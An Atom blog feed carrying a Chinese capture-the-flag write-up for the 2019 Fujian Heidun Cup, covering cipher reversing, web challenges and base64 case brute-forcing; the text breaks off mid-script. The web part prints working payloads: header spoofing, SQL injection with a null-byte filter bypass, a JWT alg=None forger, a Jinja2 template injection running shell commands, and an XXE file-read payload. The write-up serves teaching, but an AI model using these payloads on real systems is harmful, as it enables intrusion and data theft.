<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>QYMUA&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://qymua.com/"/>
  <updated>2019-09-20T11:24:30.000Z</updated>
  <id>http://qymua.com/</id>
  
  <author>
    <name>DEKU</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2019 福建省网络安全宣传周黑盾杯Writeup</title>
    <link href="http://qymua.com/2019/09/16/2019-%E7%A6%8F%E5%BB%BA%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%A3%E4%BC%A0%E5%91%A8%E9%BB%91%E7%9B%BE%E6%9D%AFWriteup/"/>
    <id>http://qymua.com/2019/09/16/2019-福建省网络安全宣传周黑盾杯Writeup/</id>
    <published>2019-09-16T13:57:47.000Z</published>
    <updated>2019-09-20T11:24:30.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>大三接棒冲刺,这一战无疑需要取得好的成绩，为后辈树立榜样！不过福建省”黑盾杯”大多都是基础入门题,就算赢了,也不能太得意XD 路还长~任重而道远呐,这里就挑几题自己做过的题目讲下,misc太基础就不多说了,bin也不说了，害，今年依旧是不会写pwn的菜菜</p><p>简单介绍下”黑盾杯”赛制,比赛时长6小时,上半场标准的夺旗赛,但没有一血奖励机制,下半场企业渗透,最后理论知识竞赛结尾(等保问题)</p><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="guess-the-key"><a href="#guess-the-key" class="headerlink" title="guess the key"></a>guess the key</h3><p>程序提供了加密方式，和一对明文密文</p><p>先逆向加密算法,写出破解key的脚本,再猜测另一份密文可能使用的Key即可</p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">plain_text = open(<span class="string">'msg01'</span>,<span class="string">'r'</span>).read().strip()</span><br><span class="line">cipher_text = open(<span class="string">'msg01.enc'</span>,<span class="string">'r'</span>).read().strip()</span><br><span class="line">cipher2_text = open(<span class="string">'msg02.enc'</span>,<span class="string">'r'</span>).read().strip()</span><br><span class="line"></span><br><span class="line">plain_text = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> plain_text]</span><br><span class="line">cipher_text = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> cipher_text]</span><br><span class="line">cipher2_text = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> cipher2_text]</span><br><span class="line"></span><br><span class="line">t = <span class="number">0</span></span><br><span class="line">f = <span class="number">0</span></span><br><span class="line">key = <span class="string">''</span></span><br><span class="line">plain = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain_text)):</span><br><span class="line">c = ((cipher_text[i] - (i*i) - plain_text[i]) ^ t) &amp; <span class="number">0xff</span></span><br><span class="line">key += chr(c)</span><br><span class="line">t = plain_text[i]</span><br><span class="line">key = key[<span class="number">0</span>:<span class="number">31</span>]</span><br><span class="line"><span class="keyword">print</span> key</span><br><span class="line"></span><br><span class="line">//VeryVeryLongKeyYouWillNeverKnowVery</span><br><span class="line"></span><br><span class="line">key = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher2_text)):</span><br><span class="line">c = (cipher2_text[i] - (key[i % len(key)] ^ f) - i*i) &amp; <span class="number">0xff</span></span><br><span class="line">plain += chr(c)</span><br><span class="line">f = c</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> plain</span><br><span class="line"></span><br><span class="line">//She had been shopping <span class="keyword">with</span> her Mom <span class="keyword">in</span> Wal-Mart. She must have been <span class="number">6</span> years old, this beautiful brown haired, freckle-faced image of innocence. It was pouring outside. The kind of rain that gushes over the top of rain gutters, so much <span class="keyword">in</span> a hurry to hit the Earth, it has no time to flow down the spout.flag&#123;<span class="number">101</span>a6ec9f938885df0a44f20458d2eb4&#125;</span><br></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="i-have-the-flag"><a href="#i-have-the-flag" class="headerlink" title="i have the_flag"></a>i have the_flag</h3><p>页面js一堆没用的函数，只有一个<code>ck</code>函数有用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ck</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ic</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> a = [<span class="number">118</span>, <span class="number">108</span>, <span class="number">112</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">104</span>, <span class="number">104</span>, <span class="number">103</span>, <span class="number">120</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>];</span><br><span class="line">    <span class="keyword">if</span> (s.length == a.length) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; s.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[i] - s.charCodeAt(i) != <span class="number">3</span>)</span><br><span class="line">                <span class="keyword">return</span> ic = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ic = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ic = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很显然解出这串Ascii值拿去提交就可以成功getflag</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">I have the Flag</span><br><span class="line">Type <span class="keyword">in</span> something <span class="keyword">to</span> <span class="builtin-name">get</span> the flag.</span><br><span class="line"></span><br><span class="line">Tips: Maybe you have the flag.</span><br><span class="line"></span><br><span class="line">Something: </span><br><span class="line">simpleedu123</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!</span><br><span class="line"></span><br><span class="line">muWn9NU0H6erBN/w+C7HVg</span><br></pre></td></tr></table></figure><h3 id="a-little-hard"><a href="#a-little-hard" class="headerlink" title="a little hard"></a>a little hard</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetIP</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>]))</span><br><span class="line">$cip = $_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>];</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>]))</span><br><span class="line">$cip = $_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>];</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]))</span><br><span class="line">$cip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">$cip = <span class="string">"0.0.0.0"</span>;</span><br><span class="line"><span class="keyword">return</span> $cip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$GetIPs = GetIP();</span><br><span class="line"><span class="keyword">if</span> ($GetIPs==<span class="string">"1.1.1.1"</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Great! Key is *********"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"�������IP���ڷ����б�֮�ڣ�"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>题目直接给了源码，阅读源码可知可通过伪造XFF头令变量<code>$GetsIP</code>值为<code>1.1.1.1</code>，构造请求头即可得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /hard/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">202.0</span><span class="number">.0</span><span class="number">.37</span></span><br><span class="line">x-forwarded-<span class="keyword">for</span>: <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h3 id="click-1"><a href="#click-1" class="headerlink" title="click_1"></a>click_1</h3><p>这题就太简单了</p><p>查看源码系列</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"esc"</span> <span class="attr">style</span>=<span class="string">"position:absolute;"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onfocus</span>=<span class="string">"nokp();"</span> <span class="attr">onclick</span>=<span class="string">"window.location='?key=700c';"</span> <span class="attr">value</span>=<span class="string">"click me!"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">readonly</span> <span class="attr">style</span>=<span class="string">"width:350;"</span> <span class="attr">id</span>=<span class="string">"hint"</span> <span class="attr">value</span>=<span class="string">"do you want to join? catch button, if you can!"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意到<code>?key=700c</code>，于是构造URL访问<a href="http://202.0.0.37/click/?key=700c即可得到flag" target="_blank" rel="noopener">http://202.0.0.37/click/?key=700c即可得到flag</a></p><h3 id="花式过waf"><a href="#花式过waf" class="headerlink" title="花式过waf"></a>花式过waf</h3><p>2018黑盾杯原题，使用工具扫描后发现有<code>www.zip</code>，下载源码开始代码审计</p><p><code>function.php</code>: eregi 可以使用 %00截断正则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filtering</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $check= eregi(<span class="string">'select|insert|update|delete|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile'</span>, $str);</span><br><span class="line">    <span class="keyword">if</span>($check)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"非法字符!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>content.php</code>: 里面直接拼接给的参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'./global.php'</span>;</span><br><span class="line">extract($_REQUEST);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select * from test.content where id=$message_id"</span>;</span><br></pre></td></tr></table></figure><p>构造请求得到flag。</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message_id=<span class="string">"%00"</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,2,<span class="title">flag</span>,4 <span class="title">from</span> <span class="title">flag</span></span></span><br></pre></td></tr></table></figure><h3 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h3><p>题目一开始只有一个文本框，要求填入email，随便填一个后有alert提示前往<a href="mailto:`/forget/step2.php?email=youremail@address.com" target="_blank" rel="noopener">`/forget/step2.php?email=youremail@address.com</a>&amp;check=?????`进行下一步</p><p>发现网页源代码中有重要信息：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"admin"</span> <span class="attr">content</span>=<span class="string">"admin@simplexue.com"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"editor"</span> <span class="attr">content</span>=<span class="string">"Vim"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>并且<code>step2.php</code>中含有一个提交到<code>submit.php</code>的表单，有<code>emailAddress</code>字段和<code>token</code>字段</p><p>看到Vim可以想到Vim编辑器在非正常退出的情况下会留下<code>.swp</code>文件，经过逐个测试发现了<code>submit.php</code>的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forget/.submit.php.swp</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">如果登录邮箱地址不是管理员则 die()</span></span><br><span class="line"><span class="comment">数据库结构</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- 表的结构 `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">CREATE TABLE IF NOT EXISTS `user` (</span></span><br><span class="line"><span class="comment">  `id` int(11) NOT NULL AUTO_INCREMENT,</span></span><br><span class="line"><span class="comment">  `username` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `email` varchar(255) NOT NULL,</span></span><br><span class="line"><span class="comment">  `token` int(255) NOT NULL DEFAULT '0',</span></span><br><span class="line"><span class="comment">  PRIMARY KEY (`id`)</span></span><br><span class="line"><span class="comment">) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- 转存表中的数据 `user`</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">INSERT INTO `user` (`id`, `username`, `email`, `token`) VALUES</span></span><br><span class="line"><span class="comment">(1, '****不可见***', '***不可见***', 0);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">........这一行是省略的代码........</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">$sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</span><br><span class="line">$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</span><br><span class="line">$r = mysql_fetch_assoc($r);</span><br><span class="line">$r = $r[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"失败了呀"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照代码构造<code>token</code>，得到flag</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">GET</span> /forget/setp2.php?<span class="attribute">emailAddress</span>=admin@simplexue.com&amp;token=0000000000</span><br></pre></td></tr></table></figure><h3 id="py一波吧-ssti-jwt-1"><a href="#py一波吧-ssti-jwt-1" class="headerlink" title="py一波吧-ssti+jwt_1"></a>py一波吧-ssti+jwt_1</h3><p><code>JWT alg=None 签名bypass攻击</code> -&gt; <code>SSTI</code>，强行把两道题拼成一道题，没有第一步不能进入SSTI</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">随便输入一个用户名密码，将cookie里面的token提取出来，解base64可得</span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">&#123;"alg":"HS256","typ":"JWT"&#125;.&#123;"username":"admin1"&#125;.signature</span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>可以生成一个用户名为admin的<code>token</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8 </span></span><br><span class="line"><span class="comment">#PyJWT</span></span><br><span class="line"><span class="keyword">import</span> jwt </span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_token</span><span class="params">()</span>:</span> </span><br><span class="line">    payload = &#123; </span><br><span class="line">         <span class="string">"username"</span>: <span class="string">"admin"</span> </span><br><span class="line">    &#125; </span><br><span class="line">    token = jwt.encode(payload, <span class="literal">None</span>, algorithm=<span class="literal">None</span>) </span><br><span class="line">    <span class="keyword">print</span> token </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">create_token()</span><br></pre></td></tr></table></figure><p>把token换上去，就可以进入SSTI流程了。</p><p>SSTI过滤了：单引号、os、system、[]</p><p>Jinja2对与不存在的对象有一个特殊的定义<strong>Undefined</strong>类，<code>&lt;class &#39;jinja2.runtime.Undefined&#39;&gt;</code></p><p><strong>jinja2/runtime.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@implements_to_string</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Undefined</span><span class="params">(object)</span>:</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>通过构造<code>title=</code>就可以搞事情了，发现有个<code>eval</code>，就是它了。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;'new_context': &lt;function new_context at 0x7fc79bb4faa0&gt;, 'chain': &lt;type 'itertools.chain'&gt;, '_context_function_types': (&lt;type 'function'&gt;, &lt;type 'instancemethod'&gt;), 'resolve_or_missing': &lt;function resolve_or_missing at 0x7fc79bb4fcf8&gt;, 'Namespace': &lt;class 'jinja2.utils.Namespace'&gt;, 'ContextMeta': &lt;class 'jinja2.runtime.ContextMeta'&gt;, 'evalcontextfunction': &lt;function evalcontextfunction at 0x7fc79bd919b0&gt;, 'escape': &lt;built-in function escape&gt;, 'LoopContext': &lt;class 'jinja2.runtime.LoopContext'&gt;, '_first_iteration': &lt;object object at 0x7fc79f5b2190&gt;, 'TemplateNotFound': &lt;class 'jinja2.exceptions.TemplateNotFound'&gt;,···'eval': &lt;built-in function eval&gt;</span><br></pre></td></tr></table></figure><p>不能用<code>[]</code>可以使用<code>.get()</code>绕过，被过滤的字符串可以拆分成2个字符串或者使用格式化字符串的方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;vvv.__class__.__init__.__globals__.get(<span class="string">"__bui"</span>+<span class="string">"ltins__"</span>).get(<span class="string">"e"</span>+<span class="string">"val"</span>)(<span class="string">"__imp"</span>+<span class="string">"ort__(\"o"</span>+<span class="string">"s\").po"</span>+<span class="string">"pen(\"ls\").read()"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>执行命令列目录，发现没有传说中的flag，但是发现了一个以数字+英文组合为文件名的文件，经过确认，就是flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;vvv.__class__.__init__.__globals__.get(<span class="string">"__bui"</span>+<span class="string">"ltins__"</span>).get(<span class="string">"e"</span>+<span class="string">"val"</span>)(<span class="string">"__imp"</span>+<span class="string">"ort__(\"o"</span>+<span class="string">"s\").po"</span>+<span class="string">"pen(\"cat f41321d3b61338c8d239e75d971f34a4\").read()"</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>本题源码在<code>/app/none</code>路径下，也可通过构造类似命令进行读取。</p><h3 id="hardupload"><a href="#hardupload" class="headerlink" title="hardupload"></a>hardupload</h3><p>在今年的Google CTF 中出了一道Blind XXE 题 bnv，可以做参考</p><p>不懂xxe建议先了解一波</p><p><a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/9302528.html</a></p><p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></p><p>上传php一句话返回错误信息</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">For Security, our system do not allow upload xml file from now on.<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span>Other file like png,jpg,rar,zip...etc is welcome<span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以上传图片等文件格式,恰好xml可以解析svg</p><p><strong>payload</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE message [</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT message ANY&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ENTITY % para1 SYSTEM "file:///hhh_Th1s_y0uR_f14g"&gt; //根据报错回显找到flag路径</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % para '</span></span><br><span class="line"><span class="meta">&lt;!ENTITY &amp;#x25; para2 "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM</span></span><br><span class="line"><span class="meta">&amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;"&gt;</span></span><br><span class="line"><span class="meta">&amp;#x25;para2;</span></span><br><span class="line"><span class="meta">'&gt;</span></span><br><span class="line"><span class="meta">%para;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>10<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意指定MIME类型 Content-Type: text/xml</p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="MaybeBase"><a href="#MaybeBase" class="headerlink" title="MaybeBase"></a>MaybeBase</h3><p><code>YMFZZTY0D3RMD3RMMTIZ 这一串到底是什么！！！！为什么这么像base32却不是！！！明文的md5值为16478a151bdd41335dcd69b270f6b985</code></p><p>可以用base64不区分大小写工具直接爆出所有可能的flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64,sys,os,redef,re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(res,arr,pos)</span>:</span></span><br><span class="line">    res.append(<span class="string">''</span>.join(arr))</span><br><span class="line">    i=pos</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(i,len(arr)):</span><br><span class="line">        <span class="keyword">if</span> arr[i]&lt;=<span class="string">'Z'</span> <span class="keyword">and</span> arr[i]&gt;=<span class="string">'A'</span>:</span><br><span class="line">            arr[i]=arr[i].lower()</span><br><span class="line">            dfs(res,arr,i+<span class="number">1</span>)</span><br><span class="line">            arr[i]=arr[i].upper()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'+'</span> + <span class="string">'-'</span> * <span class="number">50</span> + <span class="string">'+'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">u'\t  base64大小写转换解密工具'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'+'</span> + <span class="string">'-'</span> * <span class="number">50</span> + <span class="string">'+'</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'用法：'</span> + os.path.basename(sys.argv[<span class="number">0</span>]) + <span class="string">u' base64密文'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'实例：'</span> + os.path.basename(sys.argv[<span class="number">0</span>]) + <span class="string">' "AGV5IULSB3ZLVSE="'</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    arr = list(sys.argv[<span 